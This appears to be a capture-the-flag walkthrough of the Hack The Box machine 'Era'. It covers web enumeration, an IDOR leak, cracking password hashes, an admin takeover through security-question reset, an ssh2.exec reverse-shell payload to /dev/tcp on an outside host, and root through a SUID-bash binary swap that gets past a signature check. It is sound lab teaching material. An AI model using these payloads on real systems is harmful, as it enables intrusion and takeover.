# Era

## First steps

First let's scan the open ports on the machine using `nmap`.

```bash
$ nmap --min-rate 3000 10.10.11.79
Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-06 16:25 CET
Nmap scan report for era.htb (10.10.11.79)
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

Suprisingly we don't have any ssh ports which is pretty unusual. We have a FTP server running on port 21 and a HTTP server on port 80.

First, I tried to authenticate on the FTP server using anonymous login.

```bash
$ ftp 10.10.11.79
Connected to 10.10.11.79.
220 (vsFTPd 3.0.5)
Name (10.10.11.79:root): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
```

Apparently the server doesn't allow anonymous login so we will have to take a look at the port 80 instead.

```bash
$ curl -v http://10.10.11.79/
*   Trying 10.10.11.79:80...
* Connected to 10.10.11.79 (10.10.11.79) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.11.79
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 06 Dec 2025 15:44:36 GMT
< Content-Type: text/html
< Content-Length: 154
< Connection: keep-alive
< Location: http://era.htb/
< 
<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host 10.10.11.79 left intact
```

We have the domain of the website which is **era.htb** so let's add it to our `/etc/hosts`.

```
# Into /etc/hosts
10.10.11.79	era.htb
```

## Port 80: A One-page website ?

So when we first arrive on era.htb, we can see a typical commercial website that hold in one page with multiple sections.

![Landing Page](../../../assets/htb/era/website_overview.png)

There is nothing to see here... so I decided to enumerate subdirectories to find a login page or any other page that could be interesting.

To do this I use `ffuf` which is pretty efficient and flexible for web enumerations.

```bash
$ ffuf -c -w common.txt -u "http://era.htb/FUZZ" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 113ms]
fonts                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 23ms]
img                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 25ms]
index.html              [Status: 200, Size: 19493, Words: 3922, Lines: 447, Duration: 38ms]
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 25ms]
```

We found nothing relevant here, I tried to enumerate with other wordlists but I had the same result.

We can't access css, fonts, img and js. So we just have a single web page with nothing on it. 

If there is no special subdirectory, maybe we can see if the website has any valid subdomain that would redirect us on another website.

Again we will use `ffuf` to do this.

```bash
$ ffuf -c -w subdomains-top1million-5000.txt -H "Host: FUZZ.era.htb" -u "http://era.htb" -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 25ms]
:: Progress: [4989/4989] :: Job [1/1] :: 735 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

BINGO ! There is a valid subdomain which is **file.era.htb**. So let's add this to our `/etc/hosts` and take a look at what it contains.

```
# Update /etc/hosts with the new subdomain found
10.10.11.79	file.era.htb era.htb
```

## The vulnerable subdomain

So when we arrive on the website hosted on **file.era.htb** we have multiplle options that are offered to us.

![Landing Page file.era.htb](../../../assets/htb/era/file_overview.png)

It seems that this website is a file manager, but for now we can't do anything as we need to sign in to access all features.

![Sign In page](../../../assets/htb/era/signin_page.png)

Again I was blocked here so I decided to enumerate subdirectories as it may be a sign up page somewhere but it is not shown on the landing page.

I used some wordlists for this but I had an interesting result with `raft-medium-files.txt`.

```bash
$ ffuf -c -w raft-medium-files.txt -u "http://file.era.htb/FUZZ" -fs 6765

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 6765
________________________________________________

login.php               [Status: 200, Size: 9214, Words: 3701, Lines: 327, Duration: 70ms]
register.php            [Status: 200, Size: 3205, Words: 1094, Lines: 106, Duration: 80ms]
download.php            [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 34ms]
.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 39ms]
logout.php              [Status: 200, Size: 70, Words: 6, Lines: 1, Duration: 52ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 129ms]
.html                   [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 37ms]
manage.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 107ms]
.htm                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 32ms]
.htpasswds              [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 36ms]
layout.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 72ms]
reset.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 31ms]
.htgroup                [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 37ms]
.htaccess.bak           [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 34ms]
.htuser                 [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 39ms]
.ht                     [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 50ms]
.htc                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 50ms]
:: Progress: [17129/17129] :: Job [1/1] :: 921 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

There is a register page at **file.era.htb/register.php** so I created an account and then signed in to access the website's features.

![Dashboard](../../../assets/htb/era/dashboard.png)

We have 3 pages here:
- **manage.php**: allows us to delete our uploaded files and choose an automatic deletion time for our files.
- **reset.php**: allows us to modify the security questions of... any user ?!
- **upload.php**: allows us to upload any file.

Seeing this I thought it was very easy and that I just had to upload a reverse shell and I could access it from the website.

But once we have uploaded a file we can only download it at **http://file.era.htb/download.php?id=3237**

When trying to upload other files I noticed that the parameter **id** in the download URL changes for every file. So I can download different files depending on the id I give as parameter.

But where it becomes interesting it's that I can give id of files that I didn't uploaded !

> This is an **[IDOR](https://portswigger.net/web-security/access-control/idor)** vulnerability. We have access to content of other users without being authenticated as them or as administrator.

Using `ffuf` and a list of number from 1 to 3236 we can try to enumerate every download URL that is functionnal and see if there is something interesting.

Also for this enumeration I use HTTP headers because you need to be authenticated on the website to access the download page.

```bash
$ seq 1 3236 > ids.txt
$ ffuf -c -w ids.txt -u 'http://file.era.htb/download.php?id=FUZZ' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: PHPSESSID=562go2i1rk0bt1ce6kv389mabu' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' -fs 7686

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /workspace/ids.txt
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate
 :: Header           : Connection: keep-alive
 :: Header           : Cookie: PHPSESSID=562go2i1rk0bt1ce6kv389mabu
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Priority: u=0, i
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7686
________________________________________________

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 50ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 36ms]
```

So we found 2 files that we can download.

The first one is a backup of the website's source code, and the second one contains a private key and a certificate.

To be honest I didn't understood the purpose of the second file and it is not mandatory to finish the room so we will focus on the backup.

## The website source code

```bash
$ mkdir site
$ unzip site-backup-30-08-24.zip -d site
$ tree -a site                                             
site
├── bg.jpg
├── css
│   ├── fontawesome-all.min.css
│   ├── images
│   │   └── overlay.png
│   ├── main.css
│   ├── main.css.save
│   └── noscript.css
├── download.php
├── filedb.sqlite
├── files
│   ├── .htaccess
│   └── index.php
├── functions.global.php
├── index.php
├── initial_layout.php
├── layout_login.php
├── layout.php
├── LICENSE
├── login.php
├── logout.php
├── main.png
├── manage.php
├── register.php
├── reset.php
├── sass
│   ├── base
│   │   ├── _page.scss
│   │   ├── _reset.scss
│   │   └── _typography.scss
│   ├── components
│   │   ├── _actions.scss
│   │   ├── _button.scss
│   │   ├── _form.scss
│   │   ├── _icon.scss
│   │   ├── _icons.scss
│   │   └── _list.scss
│   ├── layout
│   │   ├── _footer.scss
│   │   ├── _main.scss
│   │   └── _wrapper.scss
│   ├── libs
│   │   ├── _breakpoints.scss
│   │   ├── _functions.scss
│   │   ├── _mixins.scss
│   │   ├── _vars.scss
│   │   └── _vendor.scss
│   ├── main.scss
│   └── noscript.scss
├── screen-download.png
├── screen-login.png
├── screen-main.png
├── screen-manage.png
├── screen-upload.png
├── security_login.php
├── upload.php
└── webfonts
    ├── fa-brands-400.eot
    ├── fa-brands-400.svg
    ├── fa-brands-400.ttf
    ├── fa-brands-400.woff
    ├── fa-brands-400.woff2
    ├── fa-regular-400.eot
    ├── fa-regular-400.svg
    ├── fa-regular-400.ttf
    ├── fa-regular-400.woff
    ├── fa-regular-400.woff2
    ├── fa-solid-900.eot
    ├── fa-solid-900.svg
    ├── fa-solid-900.ttf
    ├── fa-solid-900.woff
    └── fa-solid-900.woff2
```

First thing first, we have an sqlite database with `filedb.sqlite`

```bash
sqlite3 site/filedb.sqlite
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
```

We have the hashes of all the users. We also learn that the username of the admin seems to be `admin_ef01cab31aa`. I put all those hashes into a `hashes.txt` and I tried to crack some using `john`.

```bash
$ john --wordlist=`fzf-wordlists` hashes.txt         
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 12 OpenMP threads
Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
america          (eric)     
mustang          (yuri)
```

Only two of those hashes were vulnerable and now we have 2 new credentials !

**eric:america**

**yuri:mustang**

Before continuing on the website source code I tried to connect to the ftp server using those credentials.

It didn't worked with `eric`, however I successfully authenticated with `yuri` credentials.

```bash
Connected to 10.10.11.79.
220 (vsFTPd 3.0.5)
Name (10.10.11.79:root): yuri
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||60903|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
ftp> ls apache2_conf
229 Entering Extended Passive Mode (|||30551|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1332 Dec 08  2024 000-default.conf
-rw-r--r--    1 0        0            7224 Dec 08  2024 apache2.conf
-rw-r--r--    1 0        0             222 Dec 13  2024 file.conf
-rw-r--r--    1 0        0             320 Dec 08  2024 ports.conf
226 Directory send OK.
ftp> ls php8.1_conf
229 Entering Extended Passive Mode (|||18195|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
226 Directory send OK.
```

Here it seems to be the conf directory of apache and php that are used for the website.

One thing in particular is unusual, the `php8.1_conf/ssh2.so` file clearly indicates that the [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) wrapper can be used with the php source code of this app.

For now we can't do much more with this information but we will need it later.

After reading the php source code of the website I noticed some important informations.

First, just as I thought we can, indeed, modify the answer of the security questions of any user as long as we have the name of this user.

In that sense, now that we have the username of what seems to be the admin (`admin_ef01cab31aa`) we should be able to sign in as admin using the security questions method.

![Changing admin security question's answer](../../../assets/htb/era/changing_admin_answer.png)

![Sign in with admin security questions](../../../assets/htb/era/admin_signin.png)

And it worked ! Now we are authenticated as admin on the website, however it seems that we don't have acces to any interesting feature.

But if we come back to the website source code we can see a hidden feature in `download.php`

```php
// BETA (Currently only available to the admin) - Showcase file instead of downloading it
elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];

    if (strpos($format, '://') !== false) {
        $wrapper = $format;
        header('Content-Type: application/octet-stream');
    } else {
        $wrapper = '';
        header('Content-Type: text/html');
    }

    try {
        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
    $full_path = $wrapper ? $wrapper . $file : $file;
    // Debug Output
    echo "Opening: " . $full_path . "\n";
        echo $file_content;
    } catch (Exception $e) {
        echo "Error reading file: " . $e->getMessage();
    }
}
```

This part of the code is very important, because here it shows that if we have admin access we can pass 2 new URL parameter on the download page: `show` and `format`.

If they are specified, and `format` contains a php wrapper, the code will open the file but with the `format` string prepended.

But, if you remember well, we've seen that the **ssh2://** wrapper can be used on this website, it would allow us to execute any command using ssh.

So we will try to execute a reverse shell using this technique. 

## Reverse shell and access to the machine

Let's start a listener on our machine:

```bash
$ nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
```

And now we have to build our payload: we will use **ssh2.exec://** wrapper to execute a command using ssh. We need a user and it's password to do this, fortunately we have `eric` and `yuri` credentials and as we used yuri's credentials for the FTP server, we will try to use eric's credentials for ssh authentification.

So here is our payload:

```
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@localhost:22/bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.245%2F9001%200%3E%261%23
```

We encoded the reverse shell in URL format and the **%23** at the end is a '#' character so that the filepath appended to our `format` parameter is not interpreted by the ssh2:// wrapper.

Let's lauch our reverse shell and see if it works.

```bash
$ curl 'http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@localhost:22/bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.245%2F9001%200%3E%261%23' --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: PHPSESSID=562go2i1rk0bt1ce6kv389mabu' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'
```

On our listener we can see that...

```bash
$ nc -lvnp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.79.
Ncat: Connection from 10.10.11.79:59280.
bash: cannot set terminal process group (9828): Inappropriate ioctl for device
bash: no job control in this shell
eric@era:~$ 
```

It worked we are now connected on the machine as `eric` !

> **user.txt** can be found in /home/eric

## A group with special privilege

As soon as I arrived on the machine I tried common tricks like sudo -l, checking binaries with special capabilities or permissions (SUID binaries), but there is nothing that we can exploit.

However when I checked what permissions `eric` have on the machine I realized that he is part of an unusual group...

```bash
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

In fact there is files owned by the group `devs`:

```bash
eric@era:~$ find / -group devs 2> /dev/null
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

There is a binary `monitor` a a log file on which we have read / write privilege on.

## The monitor binary

The thing is that even if we can deduce that `monitor` is executed periodically by the name of the `periodic-check/` folder, we don't clearly know what is happening.

To get more information I will use the binary `pspy64`, I have to download it on the remote machine first.

I launch a HTTP server using Python on my machine:

```bash
$ ls
pspy64
$ ipa; python3 -m http.server
lo               UNKNOWN        127.0.0.1/8 ::1/128 
eth0@if11        UP             172.17.0.2/16 
tun0             UNKNOWN        10.10.14.245/23 dead:beef:2::10f3/64 fe80::3a66:60b4:3098:38eb/64 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

And then I just have to use `curl` from the target machine to fetch the file hosted on my machine:

```bash
eric@era:~$ curl -O http://10.10.14.245:8000/pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3032k  100 3032k    0     0  2485k      0  0:00:01  0:00:01 --:--:-- 2487k
eric@era:~$ chomd 777 pspy64
eric@era:~$ ls -l
total 3036
-rwxrwxrwx 1 eric eric 3104768 Dec  6 19:56 pspy64
-rw-r----- 1 root eric      33 Dec  6 15:01 user.txt
```

Now we can laucnh `pspy64` and see what is happening in background on this machine.

```bash
eric@era:~$ ./pspy64
<SNIP>
2025/12/06 20:02:01 CMD: UID=0     PID=10681  | bash -c /root/initiate_monitoring.sh 
2025/12/06 20:02:01 CMD: UID=0     PID=10682  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/12/06 20:02:01 CMD: UID=0     PID=10684  | openssl asn1parse -inform DER -in text_sig_section.bin 
2025/12/06 20:02:01 CMD: UID=0     PID=10683  | /bin/bash /root/initiate_monitoring.sh 
2025/12/06 20:02:01 CMD: UID=0     PID=10687  | grep -oP (?<=UTF8STRING        :)Era Inc. 
2025/12/06 20:02:01 CMD: UID=0     PID=10685  | /bin/bash /root/initiate_monitoring.sh 
2025/12/06 20:02:01 CMD: UID=0     PID=10690  | grep -oP (?<=IA5STRING         :)yurivich@era.com 
2025/12/06 20:02:01 CMD: UID=0     PID=10688  | /bin/bash /root/initiate_monitoring.sh 
2025/12/06 20:02:01 CMD: UID=0     PID=10691  | /bin/bash /root/initiate_monitoring.sh 
2025/12/06 20:02:04 CMD: UID=0     PID=10692  | /bin/bash /root/initiate_monitoring.sh 
2025/12/06 20:03:01 CMD: UID=0     PID=10698  | /usr/sbin/CRON -f -P 
2025/12/06 20:03:01 CMD: UID=0     PID=10697  | /usr/sbin/CRON -f -P 
2025/12/06 20:03:01 CMD: UID=0     PID=10699  | /bin/sh -c bash -c 'echo > /opt/AV/periodic-checks/status.log' 
2025/12/06 20:03:01 CMD: UID=0     PID=10700  | bash -c echo > /opt/AV/periodic-checks/status.log 
2025/12/06 20:03:01 CMD: UID=0     PID=10701  | /usr/sbin/CRON -f -P 
2025/12/06 20:03:01 CMD: UID=0     PID=10702  | bash -c /root/initiate_monitoring.sh 
2025/12/06 20:03:01 CMD: UID=0     PID=10703  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/12/06 20:03:01 CMD: UID=0     PID=10706  | /bin/bash /root/initiate_monitoring.sh 
2025/12/06 20:03:01 CMD: UID=0     PID=10708  | 
2025/12/06 20:03:01 CMD: UID=0     PID=10709  | /bin/bash /root/initiate_monitoring.sh 
2025/12/06 20:03:01 CMD: UID=0     PID=10711  | grep -oP (?<=IA5STRING         :)yurivich@era.com 
2025/12/06 20:03:01 CMD: UID=0     PID=10712  | /opt/AV/periodic-checks/monitor 
2025/12/06 20:03:04 CMD: UID=0     PID=10713  | /bin/bash /root/initiate_monitoring.sh
<SNIP>
```

So here we have our key to root. From what I have understood, here we have a script `initiate_monitoring.sh` that is executing our `monitor` binary with root privileges.

There is other things to consider in this output, but just to show you let's try to replace our `monitor` binary by a malicious program.

```bash
eric@era:/opt/AV/periodic-checks$ cp monitor original_monitor
eric@era:/opt/AV/periodic-checks$ cat main.c 
#include <stdlib.h>

int main(void)
{
	system("cp /bin/bash /tmp/pwned; chmod u+s /tmp/pwned");
	return 0;
}
eric@era:/opt/AV/periodic-checks$ gcc main.c -o monitor
```

If everything go well, we should have our root access with this. But after some minutes we still have nothing in `/tmp` so it seems that it didn't work.

When looking at the `status.log` file we have more informations about why our binary didn't executed:

```bash
eric@era:/opt/AV/periodic-checks$ cat status.log 

[*] System scan initiated...
[*] No threats detected. Shutting down...
[SUCCESS] No threats detected.
objcopy: /opt/AV/periodic-checks/monitor: can't dump section '.text_sig' - it does not exist: file format not recognized
[ERROR] Executable not signed. Tampering attempt detected. Skipping.
[*] System scan initiated...
[*] No threats detected. Shutting down...
[SUCCESS] No threats detected.
```

And here we have something that was shown in the pspy64 output earlier, the binary has to be signed to be executed by root.

More precisely it has to contain a section **.text_sig** with a certain content inside it. And that's why I made a backup of the original `monitor` earlier before replacing it. We will extract the section asked to bypass the security checks from the original binary and write it into our malicious binary.

```bash
eric@era:/opt/AV/periodic-checks$ objcopy --dump-section .text_sig=text_sig.bin /opt/AV/periodic-checks/original_monitor
eric@era:/opt/AV/periodic-checks$ objcopy --add-section .text_sig=text_sig.bin /opt/AV/periodic-checks/monitor
```

Then we just have to wait the script `initiate_monitoring.sh` to be executed an finally:

```bash
eric@era:/opt/AV/periodic-checks$ ls -l /tmp/
total 1388
-rwsr-xr-x 1 root root 1396520 Dec  6 20:37 pwned
drwx------ 2 root root    4096 Dec  6 15:00 snap-private-tmp
drwx------ 3 root root    4096 Dec  6 15:00 systemd-private-d396d6b454a94ec384676a16f15e187c-systemd-logind.service-A5rwe6
drwx------ 3 root root    4096 Dec  6 15:00 systemd-private-d396d6b454a94ec384676a16f15e187c-systemd-resolved.service-l3j5dZ
drwx------ 3 root root    4096 Dec  6 15:00 systemd-private-d396d6b454a94ec384676a16f15e187c-systemd-timesyncd.service-XsWIWE
drwx------ 2 root root    4096 Dec  6 15:00 vmware-root
eric@era:/opt/AV/periodic-checks$ /tmp/pwned -p
pwned-5.1# whoami
root
```

We are now authenticated as `root`!

> **root.txt** can be found in /root
